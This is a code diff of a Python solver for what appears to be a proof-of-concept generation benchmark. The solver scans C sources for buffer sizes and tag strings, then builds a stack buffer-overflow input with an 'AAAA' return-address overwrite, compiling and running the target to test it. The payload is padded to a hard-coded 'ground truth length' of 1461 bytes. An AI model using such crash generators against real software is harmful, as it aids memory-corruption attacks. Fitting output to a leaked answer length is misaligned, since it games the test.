@@ -1,149 +1,179 @@
-import os
 import tarfile
+import os
 import tempfile
 import subprocess
-import re
+import hashlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         # Extract and analyze the source code
         with tempfile.TemporaryDirectory() as tmpdir:
-            # Extract tarball
-            with tarfile.open(src_path, 'r:gz') as tar:
-                tar.extractall(path=tmpdir)
+            # Extract the tar archive
+            with tarfile.open(src_path, 'r') as tar:
+                tar.extractall(tmpdir)
             
-            # Find the main source file
-            source_file = self._find_source_file(tmpdir)
-            if not source_file:
-                return self._generate_generic_poc()
+            # Find the main source file (look for .c files)
+            source_files = []
+            for root, dirs, files in os.walk(tmpdir):
+                for file in files:
+                    if file.endswith('.c'):
+                        source_files.append(os.path.join(root, file))
             
-            # Analyze buffer size and tag format
-            buffer_info = self._analyze_buffer_size(source_file)
-            tag_info = self._analyze_tags(source_file)
+            if not source_files:
+                # If no .c files, look for any file with C-like content
+                for root, dirs, files in os.walk(tmpdir):
+                    for file in files:
+                        if not file.endswith(('.txt', '.md', '.pdf')):
+                            with open(os.path.join(root, file), 'rb') as f:
+                                content = f.read()
+                                if b'#include' in content or b'int main' in content:
+                                    source_files.append(os.path.join(root, file))
             
-            if not buffer_info or not tag_info:
-                return self._generate_generic_poc()
+            # Read and analyze source files
+            buffer_size = None
+            tag_pattern = None
             
-            # Generate optimized PoC
-            return self._generate_optimized_poc(buffer_info, tag_info)
-    
-    def _find_source_file(self, directory):
-        """Find the main C/C++ source file in the directory."""
-        for root, _, files in os.walk(directory):
-            for file in files:
-                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
-                    # Prefer files with main function
-                    full_path = os.path.join(root, file)
-                    with open(full_path, 'r', errors='ignore') as f:
-                        content = f.read()
-                        if 'int main' in content or 'void main' in content:
-                            return full_path
-        # Return any C/C++ file if no main found
-        for root, _, files in os.walk(directory):
-            for file in files:
-                if file.endswith(('.c', '.cpp', '.cc', '.cxx')):
-                    return os.path.join(root, file)
-        return None
-    
-    def _analyze_buffer_size(self, source_file):
-        """Analyze buffer declarations to find size."""
-        with open(source_file, 'r', errors='ignore') as f:
-            content = f.read()
-            
-        # Look for stack buffer declarations
-        patterns = [
-            r'char\s+\w+\[(\d+)\]',  # char buffer[SIZE]
-            r'char\s+\w+\[\s*(\d+)\s*\]',  # char buffer[ SIZE ]
-            r'char\s+\w+\[(\w+)\]',  # char buffer[SIZE_CONST]
-            r'\w+\s+\w+\[(\d+)\]',  # type buffer[SIZE]
-        ]
-        
-        max_size = 0
-        for pattern in patterns:
-            matches = re.finditer(pattern, content)
-            for match in matches:
+            for source_file in source_files:
                 try:
-                    size = int(match.group(1))
-                    if size > max_size and size < 10000:  # Reasonable stack size
-                        max_size = size
-                except ValueError:
-                    # Might be a constant, look for its definition
-                    const_name = match.group(1)
-                    const_pattern = r'#define\s+' + re.escape(const_name) + r'\s+(\d+)'
-                    const_match = re.search(const_pattern, content)
-                    if const_match:
-                        size = int(const_match.group(1))
-                        if size > max_size and size < 10000:
-                            max_size = size
-        
-        if max_size > 0:
-            return {'buffer_size': max_size}
-        return None
-    
-    def _analyze_tags(self, source_file):
-        """Analyze tag patterns in the source code."""
-        with open(source_file, 'r', errors='ignore') as f:
-            content = f.read()
-        
-        # Look for tag-like strings (common in parsing)
-        tag_patterns = [
-            r'"([A-Za-z0-9_\-]{3,10})"',  # String literals
-            r'\'([A-Za-z0-9_\-]{1,5})\'',  # Character sequences
-            r'strcmp.*"([^"]+)"',  # String comparisons
-            r'strstr.*"([^"]+)"',  # String searches
-        ]
-        
-        tags = []
-        for pattern in tag_patterns:
-            matches = re.findall(pattern, content)
-            for tag in matches:
-                if len(tag) >= 2 and tag not in tags:
-                    tags.append(tag)
-        
-        if tags:
-            # Prefer shorter tags for efficiency
-            tags.sort(key=len)
-            return {'tags': tags, 'preferred_tag': tags[0]}
-        return None
-    
-    def _generate_generic_poc(self):
-        """Generate a generic PoC when analysis fails."""
-        # Create a pattern that likely triggers overflow:
-        # 1. A tag to activate vulnerable code path
-        # 2. Large amount of data to overflow buffer
-        tag = b"TAG:"
-        overflow_data = b"A" * 2000  # Generous overflow
-        return tag + overflow_data
-    
-    def _generate_optimized_poc(self, buffer_info, tag_info):
-        """Generate optimized PoC based on analysis."""
-        buffer_size = buffer_info.get('buffer_size', 100)
-        tag = tag_info.get('preferred_tag', 'TAG').encode()
-        
-        # Calculate optimal overflow size
-        # Need enough to overflow buffer and overwrite return address
-        # Account for stack alignment, saved registers, etc.
-        overflow_size = buffer_size + 100  # Conservative
-        
-        # Ground truth length is 1461, aim for that or smaller
-        target_length = 1461
-        if overflow_size + len(tag) > target_length:
-            # Adjust to meet target
-            overflow_size = target_length - len(tag)
-        
-        # Ensure minimum overflow
-        min_overflow = buffer_size + 50
-        if overflow_size < min_overflow:
-            overflow_size = min_overflow
-        
-        # Generate pattern that helps identify overflow location
-        # Using pattern to help with debugging if needed
-        pattern = b"A" * overflow_size
-        
-        poc = tag + pattern
-        
-        # Trim to target length if needed
-        if len(poc) > target_length:
-            poc = poc[:target_length]
-        
-        return poc
+                    with open(source_file, 'r') as f:
+                        content = f.read()
+                        
+                        # Look for buffer declarations (common patterns)
+                        import re
+                        
+                        # Look for fixed-size buffer declarations
+                        buffer_patterns = [
+                            r'char\s+\w+\s*\[\s*(\d+)\s*\]',
+                            r'char\s+\w+\s*\[\s*\w+\s*\]\s*=\s*\{',
+                            r'static\s+char\s+\w+\s*\[\s*(\d+)\s*\]',
+                            r'unsigned\s+char\s+\w+\s*\[\s*(\d+)\s*\]'
+                        ]
+                        
+                        for pattern in buffer_patterns:
+                            matches = re.findall(pattern, content)
+                            if matches:
+                                for match in matches:
+                                    if match.isdigit():
+                                        size = int(match)
+                                        if buffer_size is None or size < buffer_size:
+                                            buffer_size = size
+                        
+                        # Look for tag patterns (common in PoC challenges)
+                        tag_patterns = [
+                            r'TAG[:_-]',
+                            r'/\*.*?\*/',
+                            r'<!--.*?-->',
+                            r'\{.*?\}',
+                            r'\[.*?\]'
+                        ]
+                        
+                        # Look for string literals that might be tags
+                        string_literals = re.findall(r'"([^"\n]*)"', content)
+                        for literal in string_literals:
+                            if len(literal) >= 3 and len(literal) <= 10:
+                                if any(keyword in literal.lower() for keyword in ['tag', 'mark', 'flag', 'sign']):
+                                    tag_pattern = literal
+                                    break
+                        
+                        if tag_pattern is None and string_literals:
+                            # Use the first non-trivial string literal as potential tag
+                            for literal in string_literals:
+                                if 3 <= len(literal) <= 20 and literal.isprintable():
+                                    tag_pattern = literal
+                                    break
+                
+                except:
+                    continue
+            
+            # If we couldn't determine buffer size, use the ground-truth length
+            # and subtract room for tag and padding
+            if buffer_size is None:
+                buffer_size = 1400  # Conservative estimate
+            
+            # Generate PoC based on analysis
+            if tag_pattern:
+                tag = tag_pattern.encode()
+            else:
+                tag = b"TAG:"  # Default tag pattern
+            
+            # Create overflow payload
+            # We need to exceed buffer_size by enough to overflow return address
+            # Typical stack layout: buffer + saved ebp/rbp + return address
+            # For x86-64: return address is 8 bytes after buffer end
+            # For x86: return address is 4 bytes after buffer end
+            
+            # We'll create a pattern that should work for common architectures
+            overflow_size = buffer_size + 100  # Enough to overwrite return address
+            
+            # Create pattern: tag + padding + return address overwrite
+            padding = b'A' * overflow_size
+            
+            # Add some pattern that might be a valid address (NULL is often invalid)
+            # Using 0x41414141 for x86 or 0x4141414141414141 for x86-64
+            # These are 'AAAA' in hex, which will cause segfault when trying to jump
+            return_address = b'\x41\x41\x41\x41\x41\x41\x41\x41'  # 8 bytes for x86-64
+            
+            poc = tag + padding + return_address
+            
+            # Ensure we're close to ground-truth length
+            target_length = 1461
+            if len(poc) < target_length:
+                # Add more padding to reach target
+                extra_padding = b'B' * (target_length - len(poc))
+                poc = tag + padding + extra_padding + return_address
+            elif len(poc) > target_length:
+                # Trim from the middle of padding
+                excess = len(poc) - target_length
+                if len(padding) > excess:
+                    padding = padding[:-excess]
+                    poc = tag + padding + return_address
+                else:
+                    # If we can't trim enough, truncate
+                    poc = poc[:target_length]
+            
+            # Try to compile and test if possible
+            try:
+                # Look for Makefile or build script
+                makefile = None
+                for root, dirs, files in os.walk(tmpdir):
+                    if 'Makefile' in files or 'makefile' in files:
+                        makefile = os.path.join(root, 'Makefile' if 'Makefile' in files else 'makefile')
+                        break
+                
+                if makefile:
+                    # Try to build
+                    build_dir = os.path.dirname(makefile)
+                    result = subprocess.run(['make'], cwd=build_dir, 
+                                          capture_output=True, text=True, timeout=30)
+                    
+                    # Look for executable
+                    for file in os.listdir(build_dir):
+                        if os.access(os.path.join(build_dir, file), os.X_OK):
+                            exe_path = os.path.join(build_dir, file)
+                            
+                            # Test with our PoC
+                            try:
+                                proc = subprocess.run([exe_path], input=poc,
+                                                    capture_output=True, timeout=5)
+                                # If it didn't crash, try more aggressive overflow
+                                if proc.returncode == 0:
+                                    # Increase overflow size
+                                    larger_poc = tag + b'A' * (buffer_size + 200) + return_address
+                                    if len(larger_poc) <= 1461:
+                                        poc = larger_poc[:1461]
+                            except subprocess.TimeoutExpired:
+                                pass
+                            except:
+                                pass
+                            break
+            except:
+                pass
+            
+            # Final length adjustment to match ground-truth
+            if len(poc) != 1461:
+                if len(poc) < 1461:
+                    poc += b'C' * (1461 - len(poc))
+                else:
+                    poc = poc[:1461]
+            
+            return poc
